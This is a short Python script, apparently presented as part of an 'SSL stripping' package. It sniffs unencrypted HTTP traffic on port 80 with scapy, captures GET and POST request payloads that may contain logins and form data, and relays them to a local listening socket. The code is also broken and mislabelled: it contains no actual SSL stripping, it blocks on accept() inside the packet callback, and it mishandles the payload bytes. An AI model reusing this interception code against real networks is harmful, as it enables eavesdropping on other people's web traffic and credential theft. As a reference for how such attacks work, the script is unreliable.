'''This package contains everything related to SSL stripping'''

from scapy.all import TCP, sniff
import socket

# Create a socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Bind the socket to the local host and port 25518
s.bind(('localhost', 25518))

# Listen for incoming connections
s.listen(1)

def packet_callback(packet):
    if packet[TCP].payload:
        data = str(packet[TCP].payload)
        if 'GET' in data or 'POST' in data:
            # Accept a connection
            conn, addr = s.accept()
            print(f"Connected by {addr}")
            # Forward the data
            conn.sendall(data.encode())
            conn.close()

sniff(filter='tcp port 80', prn=packet_callback, store=0)